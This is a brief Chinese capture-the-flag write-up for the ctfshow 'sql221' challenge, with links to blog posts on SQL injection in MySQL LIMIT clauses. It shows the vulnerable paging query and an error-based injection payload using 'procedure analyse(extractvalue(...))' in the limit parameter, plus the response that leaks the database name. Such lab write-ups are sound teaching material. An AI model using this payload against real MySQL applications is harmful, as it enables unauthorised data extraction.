# ctfshow-sql221



##### 参考p神链接

https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
//分页查询
  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;
      
```





 返回逻辑 

```
//TODO:很安全，不需要过滤
//拿到数据库名字就算你赢
```







```
http://aeb55c37-4da7-466d-b469-796fa666379b.challenge.ctf.show:8080/api/?page=1&limit=10 procedure analyse(extractvalue(1,concat(1,database())),1)
```





```
{"code":0,"msg":"\u67e5\u8be2\u5931\u8d25XPATH syntax error: 'ctfshow_web_flag_x'","count":"0","data":[]}
```

